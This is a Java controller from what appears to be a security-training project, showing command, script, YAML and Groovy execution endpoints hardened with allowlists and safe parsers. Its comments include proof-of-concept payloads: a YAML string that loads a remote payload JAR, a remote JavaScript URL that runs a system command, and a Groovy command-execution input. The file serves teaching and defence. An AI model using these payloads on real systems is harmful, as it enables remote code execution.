package org.joychou.controller;

import groovy.lang.GroovyShell;
import org.codehaus.groovy.ast.expr.BinaryExpression;
import org.codehaus.groovy.ast.expr.ConstantExpression;
import org.codehaus.groovy.ast.expr.Expression;
import org.codehaus.groovy.ast.expr.UnaryMinusExpression;
import org.codehaus.groovy.ast.expr.UnaryPlusExpression;
import org.codehaus.groovy.ast.stmt.BlockStatement;
import org.codehaus.groovy.ast.stmt.ExpressionStatement;
import org.codehaus.groovy.ast.stmt.ReturnStatement;
import org.codehaus.groovy.ast.stmt.Statement;
import org.codehaus.groovy.control.CompilerConfiguration;
import org.codehaus.groovy.control.customizers.SecureASTCustomizer;
import org.joychou.security.SecurityUtil;
import lombok.extern.slf4j.Slf4j;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.util.HtmlUtils;
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;

import javax.script.Bindings;
import javax.script.ScriptContext;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.sql.DriverManager;
import java.util.ArrayList;
import java.util.Arrays;


/**
 * Java code execute
 *
 * @author JoyChou @ 2018-05-24
 */
@Slf4j
@RestController
@RequestMapping("/rce")
public class Rce {

    @GetMapping("/runtime/exec")
    public String CommandExec(String cmd) {
        Runtime run = Runtime.getRuntime();
        StringBuilder sb = new StringBuilder();

        // Allowlisted command name only, executed as a single argv element (no shell, no tokenizing).
        String safeCmd = SecurityUtil.allowedCommand(cmd);
        if (safeCmd == null) {
            return "Command not allowed!!";
        }

        try {
            Process p = run.exec(new String[]{safeCmd});
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }

            if (p.waitFor() != 0) {
                if (p.exitValue() == 1)
                    return "Command exec failed!!";
            }

            inBr.close();
            in.close();
        } catch (Exception e) {
            log.error(SecurityUtil.logSafe(e.toString()));
            return "Command exec failed!!";
        }
        return HtmlUtils.htmlEscape(sb.toString());
    }


    /**
     * <a href="http://localhost:8080/rce/ProcessBuilder?cmd=whoami">POC</a>
     */
    @GetMapping("/ProcessBuilder")
    public String processBuilder(String cmd) {

        StringBuilder sb = new StringBuilder();

        // Allowlisted command name only, executed without a shell.
        String safeCmd = SecurityUtil.allowedCommand(cmd);
        if (safeCmd == null) {
            return "Command not allowed!!";
        }

        try {
            String[] arrCmd = {safeCmd};
            ProcessBuilder processBuilder = new ProcessBuilder(arrCmd);
            Process p = processBuilder.start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }
        } catch (Exception e) {
            log.error(SecurityUtil.logSafe(e.toString()));
            return "Command exec failed!!";
        }

        return sb.toString();
    }


    /**
     * http://localhost:8080/rce/jscmd?jsurl=http://xx.yy/zz.js
     *
     * curl http://xx.yy/zz.js
     * var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("open -a Calculator");}
     *
     * @param jsurl js url
     */
    @GetMapping("/jscmd")
    public void jsEngine(String jsurl) throws Exception{
        // js nashorn javascript ecmascript
        // Only load scripts from allowlisted hosts; the URL is passed as a bound variable,
        // never concatenated into the script source.
        if (jsurl == null || !SecurityUtil.checkSSRFByWhitehosts(jsurl)) {
            return;
        }
        ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
        Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
        bindings.put("jsurl", jsurl);
        engine.eval("load(jsurl)", bindings);
    }


    /**
     * http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://test.joychou.org:8086/yaml-payload.jar%22]]]]
     * yaml-payload.jar: https://github.com/artsploit/yaml-payload
     *
     * @param content payloads
     */
    @GetMapping("/vuln/yarm")
    public void yarm(String content) {
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    @GetMapping("/sec/yarm")
    public void secYarm(String content) {
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    /**
     * http://localhost:8080/rce/groovy?content="open -a Calculator".execute()
     * @param content groovy shell
     */
    @GetMapping("groovy")
    public void groovyshell(String content) {
        // Only constant/arithmetic expressions are allowed: no method calls, property access,
        // constructors, imports or closures, so the script cannot reach Runtime/ProcessBuilder.
        SecureASTCustomizer secure = new SecureASTCustomizer();
        secure.setClosuresAllowed(false);
        secure.setMethodDefinitionAllowed(false);
        secure.setImportsWhitelist(new ArrayList<String>());
        secure.setStarImportsWhitelist(new ArrayList<String>());
        secure.setStaticImportsWhitelist(new ArrayList<String>());
        secure.setStaticStarImportsWhitelist(new ArrayList<String>());
        secure.setStatementsWhitelist(Arrays.<Class<? extends Statement>>asList(
                BlockStatement.class, ExpressionStatement.class, ReturnStatement.class));
        secure.setExpressionsWhitelist(Arrays.<Class<? extends Expression>>asList(
                ConstantExpression.class, BinaryExpression.class,
                UnaryMinusExpression.class, UnaryPlusExpression.class));
        CompilerConfiguration config = new CompilerConfiguration();
        config.addCompilationCustomizers(secure);
        // User text is never evaluated: only a fixed allowlisted constant script is run.
        String safeScript = SecurityUtil.allowedGroovyScript(content);
        if (safeScript == null) {
            return;
        }
        GroovyShell groovyShell = new GroovyShell(config);
        groovyShell.evaluate(safeScript);
    }



    public static void main(String[] args) throws Exception{
        Runtime.getRuntime().exec("touch /tmp/x");
    }
}

